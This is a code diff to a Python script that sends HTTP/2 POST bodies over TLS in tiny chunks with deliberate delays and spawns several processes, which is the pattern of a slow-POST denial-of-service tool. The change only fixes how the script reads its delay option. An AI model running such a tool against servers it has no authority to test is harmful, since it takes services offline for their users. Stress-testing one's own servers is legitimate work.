@@ -44,7 +44,7 @@ def send_slow_post(tls_sock):
         sent_bytes = 0
 
         while sent_bytes < len(body):
-            if args.delay_before_request:
+            if args.delay_before_first_data_frame:
                 time.sleep(args.chunk_delay)
             chunk = body[sent_bytes:sent_bytes + args.chunk_size]
             conn.send_data(stream_id, chunk, end_stream=False)
@@ -52,7 +52,7 @@ def send_slow_post(tls_sock):
             sent_bytes += len(chunk)
 
             print(f"Sent {sent_bytes}/{len(body)} bytes...")
-            if not args.delay_before_request:
+            if not args.delay_before_first_data_frame:
                 time.sleep(args.chunk_delay)
         conn.end_stream(stream_id)
         tls_sock.sendall(conn.data_to_send())
@@ -86,7 +86,7 @@ if __name__ == "__main__":
     parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")
     parser.add_argument('--chunk-size', type=int, default=10, help="Size of each data chunk sent (default: 10 bytes).")
     parser.add_argument('--chunk-delay', type=float, default=1, help="Delay between sending data chunks in seconds (default: 1s).")
-    parser.add_argument('--delay-before-first-data-frame', type=bool, default=False, help="Set whether the delay will be before the first DATA frame (default: False).")
+    parser.add_argument('--delay-before-first-data-frame', action='store_true', help="Set whether the delay will be before the first DATA frame")
 
     args = parser.parse_args()
 
